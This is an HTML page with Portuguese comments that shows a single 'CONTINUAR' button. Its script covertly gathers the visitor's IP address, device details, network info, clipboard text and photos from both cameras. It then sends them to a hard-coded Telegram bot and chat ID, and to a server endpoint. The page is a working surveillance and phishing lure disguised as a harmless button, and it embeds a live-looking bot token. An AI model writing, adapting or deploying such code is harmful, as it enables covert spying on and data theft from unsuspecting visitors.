<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<style>
html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center;font-family:sans-serif}
button{padding:40px 80px;font:24px;background:#0f0;border:none;border-radius:8px;cursor:pointer;box-shadow:0 4px 12px rgba(0,255,0,.3)}
button:active{transform:scale(.98)}
</style>
</head>
<body>
<button id="b">CONTINUAR</button>

<script>
const BOT_TOKEN = "8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
const CHAT_ID   = "8792921881";

const dados = {
 altura: null,
 wifi: null,
 ip: null,
 device: null,
 fotos: [],
 clipboard: null
};

b.onclick = async () => {
 b.textContent = "COLETANDO...";
 b.disabled = true;

 // ALTURA DO CHÃO (via sensor de proximidade ou estimativa)
 if ('ProximitySensor' in window) {
   try {
     const sensor = new ProximitySensor();
     sensor.onreading = () => {
       dados.altura = sensor.distance ? `${sensor.distance} cm` : 'indisponível';
     };
     sensor.start();
     await new Promise(r => setTimeout(r, 500));
   } catch(e) {
     dados.altura = 'sensor não disponível';
   }
 } else {
   // Fallback: estimativa via acelerômetro (queda livre = ~0, parado = distância até o chão)
   dados.altura = 'use sensor de proximidade ou mantenha parado';
 }

 // WIFI (SSID conectado + redes salvas visíveis)
 const conexao = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 dados.wifi = {
   ssid: 'não disponível (precisa de permissão de localização)',
   tipo: conexao?.effectiveType || 'desconhecido',
   downlink: conexao?.downlink ? `${conexao.downlink} Mbps` : 'n/a'
 };

 // Tentativa de redes Wi-Fi próximas (Chrome 98+ Android, experimental)
 if ('getWifiInfo' in navigator) {
   try {
     const wifi = await navigator.getWifiInfo();
     dados.wifi.ssid = wifi.ssid || wifi.SSID || 'oculto';
   } catch(e) {}
 }

 // IP PÚBLICO
 try {
   const ipRes = await fetch('https://api.ipify.org?format=json');
   const ipData = await ipRes.json();
   dados.ip = ipData.ip;
 } catch(e) {
   dados.ip = 'não obtido';
 }

 // DISPOSITIVO + SISTEMA
 dados.device = {
   modelo: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'desconhecido',
   plataforma: navigator.platform,
   sistema: navigator.userAgent,
   linguagem: navigator.language,
   resolucao: `${screen.width}x${screen.height}`
 };

 // CLIPBOARD
 try {
   const clip = await navigator.clipboard.readText();
   dados.clipboard = clip || '(vazio)';
 } catch(e) {
   dados.clipboard = 'sem acesso (precisa de interação)';
 }

 // FOTOS (frontal + traseira)
 const streams = [];
 
 try {
   const front = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
   const frontBlob = await captura(front, 'frontal');
   streams.push(front);
   
   const rear = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
   const rearBlob = await captura(rear, 'traseira');
   streams.push(rear);

   // Envia fotos
   await enviaFoto(frontBlob, 'frontal.jpg');
   await enviaFoto(rearBlob, 'traseira.jpg');

   // Limpa streams
   streams.forEach(s => s.getTracks().forEach(t => t.stop()));

 } catch(e) {
   dados.fotos.push('erro: ' + e.message);
 }

 // MONTA RELATÓRIO
 const relatorio = `
📊 RELATÓRIO DO DISPOSITIVO

📏 ALTURA DO CHÃO: ${dados.altura}

📶 WI-FI:
• SSID: ${dados.wifi.ssid}
• Tipo: ${dados.wifi.tipo}
• Velocidade: ${dados.wifi.downlink}

🌐 IP PÚBLICO: ${dados.ip}

📱 DISPOSITIVO:
• Modelo/SoC: ${dados.device.modelo}
• Plataforma: ${dados.device.plataforma}
• Resolução: ${dados.device.resolucao}
• Idioma: ${dados.device.linguagem}

📋 CLIPBOARD:
"${dados.clipboard}"

⏱️ Coleta em: ${new Date().toLocaleString('pt-BR')}
`;

 // Envia relatório único
 await enviaRelatorio(relatorio);
 await SALVA({t:'relatorio',v:relatorio,timestamp:Date.now()});

 b.textContent = "ENVIADO ✓";
 b.style.background = "#0a0";
};

// FUNÇÕES AUXILIARES
function captura(stream, nome) {
 return new Promise((resolve, reject) => {
   const v = document.createElement('video');
   v.srcObject = stream;
   v.play();
   
   const c = document.createElement('canvas');
   c.width = 1280;
   c.height = 720;
   const x = c.getContext('2d');
   
   setTimeout(() => {
     x.drawImage(v, 0, 0, c.width, c.height);
     c.toBlob(blob => {
       if (blob) resolve(blob);
       else reject('falha na captura');
     }, 'image/jpeg', 0.85);
   }, 800);
 });
}

async function enviaFoto(blob, nome) {
 const fd = new FormData();
 fd.append('photo', blob, nome);
 fd.append('chat_id', CHAT_ID);
 
 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
   method: 'POST',
   body: fd
 });
}

function enviaRelatorio(texto) {
 return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({
     chat_id: CHAT_ID,
     text: texto,
     parse_mode: 'HTML'
   })
 });
}

function SALVA(obj) {
 return fetch('/api/salva', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify(obj)
 }).catch(() => {});
}
</script>
</body>
</html>
